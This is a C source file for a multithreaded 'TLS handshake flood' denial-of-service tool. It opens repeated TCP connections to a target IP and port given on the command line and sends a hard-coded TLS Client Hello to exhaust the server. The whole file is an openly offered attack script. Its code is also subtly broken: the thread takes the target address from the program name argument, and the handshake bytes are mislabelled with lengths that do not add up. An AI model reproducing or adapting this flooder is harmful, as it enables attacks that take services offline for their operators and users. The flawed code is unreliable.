#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define MAX_THREADS 50
#define MAX_CONNECTIONS 1000

// TLS Client Hello message (handshake inicio)
unsigned char tls_client_hello[] = {
    // TLS Record Layer
    0x16, // Content Type: Handshake (22)
    0x03, 0x01, // Version: TLS 1.0 (0x0301)
    0x00, 0xdc, // Length: 220
    
    // Handshake Protocol: Client Hello
    0x01, // Handshake Type: Client Hello (1)
    0x00, 0x00, 0xd8, // Length: 216
    0x03, 0x01, // Version: TLS 1.0
    
    // Random (32 bytes)
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
    
    0x00, // Session ID Length: 0
    0x00, 0x66, // Cipher Suites Length: 102
    
    // Cipher Suites (51 suites)
    0xc0, 0x2c, 0xc0, 0x2b, 0xc0, 0x30, 0xc0, 0x2f,
    0x00, 0x9f, 0x00, 0x9e, 0xc0, 0x24, 0xc0, 0x23,
    0xc0, 0x28, 0xc0, 0x27, 0xc0, 0x0a, 0xc0, 0x09,
    0xc0, 0x14, 0xc0, 0x13, 0x00, 0x9d, 0x00, 0x9c,
    0x00, 0x3d, 0x00, 0x3c, 0x00, 0x35, 0x00, 0x2f,
    0xc0, 0x08, 0xc0, 0x12, 0x00, 0x0a, 0x00, 0x13,
    0x00, 0x09, 0x00, 0x63, 0x00, 0x62, 0x00, 0x15,
    0x00, 0x12, 0x00, 0x61, 0x00, 0x60, 0x00, 0x16,
    0x00, 0x0b, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x18,
    0x00, 0x17, 0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x07,
    0x00, 0x05, 0x00, 0x04, 0x00, 0xff, 0x01, 0x00,
    
    0x00, 0x0d, // Compression Methods Length: 13
    // Compression Methods
    0x00, 0x08, 0x06, 0x01, 0x06, 0x02, 0x06, 0x03,
    0x05, 0x01, 0x05, 0x02, 0x05, 0x03, 0x04, 0x01,
    0x04, 0x02, 0x04, 0x03,
    
    0x00, 0x00 // Extensions Length: 0
};

void *tcp_tls_flood(void *arg) {
    char **args = (char **)arg;
    char *target_ip = args[0];
    int target_port = atoi(args[2]);
    int duration = atoi(args[3]);
    
    time_t start = time(NULL);
    unsigned long connections = 0;
    
    while(time(NULL) - start < duration) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) {
            continue;
        }
        
        // Configurar timeout
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
        
        // Conectar
        if(connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            // Enviar Client Hello (inicio TLS handshake)
            send(sock, tls_client_hello, sizeof(tls_client_hello), 0);
            
            // Esperar respuesta del servidor (opcional)
            char buffer[1024];
            recv(sock, buffer, sizeof(buffer), 0);
            
            connections++;
            
            if(connections % 100 == 0) {
                printf("[TCP-TLS] Thread: %lu TLS handshakes to %s:%d\n", 
                       connections, target_ip, target_port);
            }
        }
        
        close(sock);
        
        // Pequeña pausa entre conexiones
        usleep(1000);
    }
    
    printf("[TCP-TLS] Thread completed - %lu handshakes attempted\n", connections);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("TCP-TLS Flood - TLS Handshake Attack\n");
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }
    
    printf("[TCP-TLS] Starting TLS Flood on %s:%d for %s seconds\n", 
           argv[1], atoi(argv[2]), argv[3]);
    printf("[TCP-TLS] Sending TLS Client Hello handshake requests\n");
    
    // Inicializar OpenSSL (opcional)
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    pthread_t threads[MAX_THREADS];
    
    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, tcp_tls_flood, argv);
    }
    
    sleep(atoi(argv[3]));
    
    // Esperar que terminen los threads
    for(int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("[TCP-TLS] Attack completed\n");
    return 0;
}
